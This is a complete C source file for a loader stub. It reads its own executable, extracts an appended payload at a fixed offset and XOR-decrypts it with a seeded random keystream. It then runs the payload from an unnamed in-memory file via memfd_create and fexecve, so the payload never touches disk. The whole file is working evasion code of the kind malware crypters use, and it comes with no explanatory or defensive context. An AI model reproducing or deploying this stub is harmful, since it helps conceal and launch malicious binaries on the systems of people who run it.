#define _GNU_SOURCE

#include <sys/mman.h>

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv) {
	int OFFSET = 0x704f6666;
	int payloadLen;
	int payloadFd;

	char filePath[1000];

    FILE *file;
	char *buffer;
	unsigned long fileLen;

    unsigned char *payload;
	int key = 0x6b657931;

	srand(key);

    readlink("/proc/self/exe", filePath, 1000);

	file = fopen(filePath, "rb");
	fseek(file, 0, SEEK_END);
	fileLen = ftell(file);
	payloadLen = fileLen - OFFSET;
	fseek(file, 0, SEEK_SET);
	buffer = malloc(fileLen + 1);
	fread(buffer, fileLen, 1, file);
	fclose(file);

    payload = malloc(payloadLen);

	memcpy(payload, buffer + OFFSET, payloadLen);

	for (int i = 0; i < payloadLen; i++) {
        payload[i] = payload[i] ^ random() % 256;
	}

	payloadFd = memfd_create("", 0);
	write(payloadFd, payload, payloadLen);

    char *payloadEnv[] = { NULL };
    fexecve(payloadFd, argv , payloadEnv);
	close(payloadFd);
}
